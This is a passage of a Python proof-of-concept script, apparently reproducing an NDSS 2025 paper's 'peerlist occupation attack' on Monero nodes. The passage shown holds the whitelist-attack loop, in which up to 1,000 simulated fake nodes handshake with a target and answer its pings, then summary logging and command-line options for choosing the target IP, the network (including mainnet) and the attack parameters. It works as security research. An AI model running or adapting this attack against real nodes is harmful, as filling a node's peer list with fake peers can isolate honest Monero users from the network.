                    gray_failed += 1
                    logger.info(f"[Phase1] Graylist node {claimed_port} failed")
            except Exception as e:
                gray_failed += 1
                logger.warning(f"[Phase1] Graylist node {claimed_port} exception: {e}")

    # ---- Phase 2: Whitelist attack - connect, handshake, wait for pong, disconnect ----
    logger.info("\n[Phase 2] Whitelist attack: connect -> handshake -> pong -> disconnect")
    successful = 0
    failed = 0
    for idx, (node_id, claimed_port, peer_id) in enumerate(whitelist_nodes):
        source_port = config.source_port_base + node_id
        if perform_simulated_handshake(config, network_id, claimed_port, peer_id, source_port):
            successful += 1
        else:
            failed += 1
        # Progress logging
        total = idx + 1
        if total % 100 == 0:
            logger.info(f"Progress: {total}/{len(whitelist_nodes)} "
                        f"(successful: {successful}, failed: {failed})")
        # Rate limiting
        if config.delay_between_handshakes > 0:
            time.sleep(config.delay_between_handshakes)
    # Give time for last ping-backs to complete
    logger.info("Waiting for final ping-backs to complete...")
    time.sleep(2.0)
    # ---- Cleanup ----
    logger.info("\n[Cleanup] Stopping ping listeners...")
    stop_ping.set()
    for srv in ping_listeners.values():
        try:
            srv.close()
        except Exception:
            pass
    # ---- Summary ----
    logger.info("\n" + "=" * 70)
    logger.info("Whitelist Occupation Attack Summary")
    logger.info("=" * 70)
    logger.info(f"Graylist handshakes: {gray_successful} successful, {gray_failed} failed")
    logger.info(f"Total fake nodes: {config.num_fake_nodes}")
    logger.info(f"Successful handshakes: {successful}")
    logger.info(f"Failed: {failed}")
    logger.info(f"Success rate: {100*successful/config.num_fake_nodes:.1f}%")
    logger.info(f"Ping listeners active: {len(ping_listeners)}")
    logger.info(f"Ping-backs received (pong sent): {_ping_success_count}")
    logger.info(f"Ping-backs failed: {_ping_fail_count}")
    logger.info("=" * 70)
    logger.info("Check whitelist with: curl -s http://127.0.0.1:28081/get_peer_list | python3 -c \"import sys,json; wl=json.load(sys.stdin).get('white_list',[]); print(f'Whitelist: {len(wl)} peers'); [print(f'  {p[\\\"host\\\"]}:{p[\\\"port\\\"]}') for p in wl[:20]]\"")
    return successful, failed

# =============================================================================
# Main Entry Point
# =============================================================================
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Monero Peerlist Occupation Attack - PoC (NDSS 2025 Paper)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Experiment Settings (from NDSS 2025 paper):
  The target node should be modified to:
  - Allow multiple connections from the same IP address
  - Allow same IP with different peer_ids in the whitelist
  This allows simulating 1000+ attacker nodes from a single machine.
        """
    )
    parser.add_argument('--target', '-t', default='127.0.0.1',
                        help='Target node IP address (default: 127.0.0.1)')
    parser.add_argument('--port', '-p', type=int, default=18080,
                        help='Target node P2P port (default: 18080)')
    parser.add_argument('--network', '-n', choices=['mainnet', 'testnet', 'stagenet'],
                        default='mainnet', help='Network type (default: mainnet)')
    # Attack mode selection
    mode_group = parser.add_mutually_exclusive_group()
    mode_group.add_argument('--simulate', '-s', action='store_true',
                           help='Simulated attack mode (paper experiment settings)')
    # Simulation parameters
    parser.add_argument('--nodes', type=int, default=1000,
                        help='Number of fake nodes to simulate (default: 1000)')
    parser.add_argument('--port-base', type=int, default=20000,
                        help='Base claimed port for fake nodes (default: 20000)')
    parser.add_argument('--source-port-base', type=int, default=30000,
                        help='Base source port for outgoing connections (default: 30000)')
    parser.add_argument('--concurrent', type=int, default=10,
                        help='Max concurrent connections (default: 10)')
    # Timing parameters
    parser.add_argument('--delay', '-d', type=float, default=0.05,
                        help='Delay between handshakes in seconds (default: 0.05)')
    parser.add_argument('--timeout', type=float, default=10.0,
                        help='Connection timeout in seconds (default: 10.0)')
    parser.add_argument('--keepalive-interval', type=float, default=30.0,
                        help='Keep-alive interval in seconds (default: 30.0)')
    parser.add_argument('--no-keepalive', action='store_true',
                        help='Disable keep-alive (connections close after handshake)')
    # Output control
    parser.add_argument('--quiet', '-q', action='store_true',
                        help='Reduce output verbosity')
    parser.add_argument('--debug', action='store_true',
                        help='Enable debug output')
    args = parser.parse_args()
    # Configure logging level
    if args.debug:
        logging.getLogger().setLevel(logging.DEBUG)
    elif args.quiet:
        logging.getLogger().setLevel(logging.WARNING)
    # Select network ID
    network_ids = {
        'mainnet': MAINNET_NETWORK_ID,
        'testnet': TESTNET_NETWORK_ID,
        'stagenet': STAGENET_NETWORK_ID
    }
    network_id = network_ids[args.network]
    logger.info(f"Network: {args.network}")
    logger.info(f"Network ID: {network_id.hex()}")
    if args.simulate:
        # Simulated multi-node attack (paper's experiment settings)
        config = AttackConfig(
            num_fake_nodes=args.nodes,
            target_ip=args.target,
            target_port=args.port,
            claimed_port_base=args.port_base,
            source_port_base=args.source_port_base,
            delay_between_handshakes=args.delay,
            connection_timeout=args.timeout,
            max_concurrent=args.concurrent,
            network=args.network,
            keep_alive=not args.no_keepalive,
            keep_alive_interval=args.keepalive_interval
        )
        simulated_peerlist_occupation_attack(config)
    else:
        # Single handshake test
        logger.info(f"\n[*] Testing single handshake to {args.target}:{args.port}")
        success = send_handshake(
            source_ip=None,
            target_ip=args.target,
            target_port=args.port,
            network_id=network_id,
            verbose=not args.quiet
        )
        exit(0 if success else 1)